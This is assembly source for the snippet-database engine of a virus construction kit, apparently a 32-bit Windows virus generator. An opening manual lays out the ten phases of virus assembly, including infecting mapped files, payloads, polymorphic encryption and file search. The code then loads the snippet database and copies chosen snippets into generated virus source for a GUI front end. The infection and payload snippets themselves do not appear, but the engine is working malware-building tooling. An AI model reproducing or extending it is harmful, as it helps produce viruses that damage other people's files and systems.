;manual
;
;the generated virus have 10 phases. for each phase, can exists more than
;one option of code. the current virus phases are:
;
;0 -red tape and shits like (ex. .586, .MODEL FLAT, etc)
;1*-macros to retrieve APIs (ex. plain, checksum)
;2 -virus init. setup return2host and get kernel32.dll base
;3 -map file to memory
;4*-infect mapped file
;5*-payload
;6*-encryption/poly
;7*-file search method
;8 -get apis (use macros definited above)
;9 -virus end. more red tape and host stub.
;
;phases marked with * are the ones that usually give users choice.
;
;database also support others phases, but these arent used by normal virus
;generation, but internally, to one snippet(phase 0..9) include another
;snippet(phase >9), thus sharing code.
;
;so, GUI code must have this in mind, and call the routines below for each
;phase. phases are independent, so, snippets options cant affect more than
;one phase(the engine dont remember choices made, and dont give option to
;show options from another 'branch', based in user previous answer)
;
;GUI code must have function malloc() and free(), that get 1 param each.
;these routines must clean the stack (RET 4)
;
;to use the engine, GUI should call VOID load_db(VOID). it will load the
;database in memory, and construct a linked-list of snippet_struc, that hold
;all info about snippets
;
;after this, GUI must call VOID init_db(VOID). it will alloc memory for API
;processing.
;
;two function do the interface with database. first one is:
;
;DWORD get_level_entries(DWORD phase,PTR buffer)
;with this function, GUI query the database about snippets for each phase.
;if there´s no snippet for requested phase, EAX=0 is returned. if there´s any
;EAX return with count, and 'buffer' is filled with names. each name is
;always 4 bytes long (1 dword)
;
;DWORD get_name_options(DWORD name)
;this function return a pointer to the snippet_struc related with 'name'
;param. this struct hold info as number of params requiered, and description
;of snippet. at exit, EBX(*NOT* EAX) point to snippet_struc structure
;
;to copy a snippet to the buffer in EDI, you call:
;
;DWORD copy_snippet(DWORD name)
;this routine copy to EDI the snippet with name 'name'. it take care of API
;tracking and all shit. just call to copy to EDI. at exit, EDI (*NOT* EAX)
;point to end of copied code
;
;remember that 'name', in all functions, is not a pointer to a string, but
;a 4 bytes name (ex. PUSH "POLY" or MOV EAX,"INFF")
;
;by last, GUI must call VOID cleanup_db(VOID), thats free engine buffers




;after the .DAT file is loaded in memory, a linked-list of the following
;structure is created

snippet_struc 	struc
  ptr2next	dd ?
  level		dd ?
  params	dd ?
  name		dd ?
  ptr2help	dd ?
  ptr2data	dd ?
ends


.data
import_macro	db "API %s",13,10,0
database 	db "VCL32.DAT",0
snippet_chain 	dd 0
import_list	dd 0
import_list_ptr	dd 0


.code

;init variables for a new virus creation
init_db:
	pushad

	push 64*1024
	call malloc

	mov [import_list],eax
	mov [import_list_ptr],eax

	popad
	ret


;destroy (free allocated mem and etc)
cleanup_db:
	pushad

	push dwo [import_list]
	call free

	mov ecx,[snippet_chain]
  @@free_snippet:
  	jecxz @@allfree
	push dwo [ecx.ptr2next]
	push ecx
	call free
	pop ecx
	jmp @@free_snippet

  @@allfree:
	popad
	ret


;copy data from param2 to param1, paying attention to special codes (internal)
copy_data:
	pushad
	mov esi,[esp.cPushad.Arg1]
  @@copy_loop:
  	cmp dwo [esi],"@@@;"
  	je @@put_import_macros
  	cmp dwo [esi],"###;"
  	je @@add_import2list
  	cmp dwo [esi],"$$$;"
  	jne @@normal_copy

  @@include_snippet:
  	lodsd
  	lodsd
  	push eax
  	call copy_snippet
	jmp @@copy_loop

  @@put_import_macros:
	lodsd
  	push esi
	mov esi,[import_list]

  @@import_next:
	push esi
	push ofs import_macro
	push edi
	callW _wsprintfA
	add edi,eax
	add esp,3*4

  @@skipname:
  	lodsb
  	test al,al
  	jnz @@skipname
  	cmp by [esi],al
  	jnz @@import_next

	pop esi
	jmp @@copy_loop

  @@add_import2list:
	lodsd

	pushad
	mov ebx,esi
	mov ebp,esi

  @@seekend:
	cmp wo [ebp],0a0dh
	je @@set0
	inc ebp
	jmp @@seekend
  @@set0:
	mov by [ebp],0

	mov esi,[import_list]
  @@check:

	push esi
	push ebx
	callW lstrcmpA
	test eax,eax
	jne @@next

	mov wo [ebp],0a0dh
	mov [esp.Pushad_esi],ebp
	popad
	jmp @@copy_loop

  @@next:
  	lodsb
  	test al,al
  	jnz @@next

	cmp esi,[import_list_ptr]
	jb @@check

	mov wo [ebp],0a0dh
	popad

  	push edi
	mov edi,[import_list_ptr]
  @@seek_end:
	cmp wo [esi],0a0dh
	je @@done_cpy
	lodsb
	stosb
	jmp @@seek_end
  @@done_cpy:
  	lodsw
  	sub eax,eax
  	stosb

	mov [import_list_ptr],edi

	pop edi
	jmp @@copy_loop

  @@normal_copy:
	lodsb
	test al,al
	jz @@done
	stosb
	jmp @@copy_loop

  @@done:
	mov [esp.Pushad_edi],edi
	popad
	ret 4


;input: snippet name/return end of copied code(edi)
;(params requiered by snippet must be in stack, and arent removed)
copy_snippet:
	pushad
	mov ebx,[esp.cPushad.Arg1]
	mov esi,[snippet_chain]
  @@check_loop:
  	cmp [esi.name],ebx
  	jnz @@check_next

  	mov ebx,[esi.ptr2data]
  	mov ebp,[esi.params]
  	test ebp,ebp
  	jz @@copy
	push 128*1024
	call malloc

	mov ecx,ebp
	lea edx,[esp.cPushad.Arg2]
  @@pushparams:
	push dwo [edx]
	add edx,4
	loop @@pushparams

	push ebx
	push eax
	mov ebx,eax
	call my_printf

	shl ebp,2
	add esp,ebp
	add esp,2*4

  @@copy:
  	push ebx
	call copy_data

  	mov ecx,[esi.params]
  	jecxz @@done
	push ebx
	call free
	jmp @@done

  @@check_next:
	mov ecx,[esi.ptr2next]
	jecxz @@done
	mov esi,ecx
	jmp @@check_loop
  @@done:
	mov [esp.Pushad_edi],edi
	popad
	ret 4


;get snippet name, return snippet struc ptr
get_name_options:
	pushad
	mov ebx,[esp.cPushad.Arg1]
	mov esi,[snippet_chain]
  @@check_loop:
  	cmp [esi.name],ebx
  	jnz @@check_next
	mov [esp.Pushad_ebx],esi
	jmp @@done
  @@check_next:
	mov ecx,[esi.ptr2next]
	jecxz @@done
	mov esi,ecx
	jmp @@check_loop
  @@done:
	popad
	ret 4



;return eax=number of entries in param1 level/param2=ptr2list of names
get_level_entries:
	sub eax,eax
	pushad
	mov ebx,[esp.cPushad.Arg1]
	mov edi,[esp.cPushad.Arg2]
	mov esi,[snippet_chain]
  @@check_loop:
  	cmp [esi.level],ebx
  	jnz @@check_next
  	inc dwo [esp.Pushad_eax]
  	mov eax,[esi.name]
  	stosd
  @@check_next:
	mov ecx,[esi.ptr2next]
	jecxz @@done
	mov esi,ecx
	jmp @@check_loop
  @@done:
	popad
	ret 4*2


;build database of snippets
load_db:
	pushad

	push 0
	push 80h
	push 3
	push 0
	push 0
	push 0c0000000h
	push ofs database
	callW CreateFileA
	mov ebx,eax
	inc eax
	jz @@done

	push 0
	push ebx
	callW GetFileSize
	mov edi,eax

	push eax
	call malloc
	mov esi,eax

	push 0
	mov eax,esp
	push 0
	push eax
	push edi
	push esi
	push ebx
	callW ReadFile

	mov [esp],ebx
	callW CloseHandle

	lea ebp,[esi+edi]
	mov ebx, ofs snippet_chain
  @@next_record:
	cmp esi,ebp
	jae @@done

	push size snippet_struc
	call malloc

	mov [ebx.ptr2next],eax
	mov ebx,eax
	mov edi,eax

	sub eax,eax
	stosd
	lodsb
	stosd
	lodsb
	stosd
	lodsd
	stosd
        sub eax,eax
        lodsb

	push eax
	inc eax
	push eax
	call malloc
	stosd
	pop ecx

	push edi
	mov edi,eax
	rep movsb
	pop edi

        lodsd

	mov eax,[esi+4]
	inc eax
	push eax
	call malloc
	stosd
	mov edi,eax

	call z_decode_asm

	add esi,[esi]
	jmp @@next_record
  @@done:
	popad
	ret


include z_decode.inc


my_printf:
	pushad

	mov edi,[esp.cPushad.Arg1]
	mov esi,[esp.cPushad.Arg2]
	lea ebx,[esp.cPushad.Arg3]
  	sub eax,eax

  @@copyloop:
  	lodsb
  	test al,al
  	jz @@done
  	cmp al,"%"
  	je @@code
  	stosb
  	jmp @@copyloop

  @@code:
  	sub ecx,ecx
  @@checkloop:
  	lodsb
  	cmp al,"s"
  	je @@string
  	sub al,"0"
  	imul ecx,ecx,10
  	add ecx,eax
	jmp @@checkloop

  @@string:
  	test ecx,ecx
	jne @@sizeset
	mov ecx,128
  @@sizeset:
	push esi
	mov esi,[ebx]
	add ebx,4
  @@cpy2:
  	lodsb
  	test al,al
  	jz @@dne2
  	stosb
  	loop @@cpy2
  @@dne2:
	pop esi
	jmp @@copyloop

  @@done:
	popad
	ret
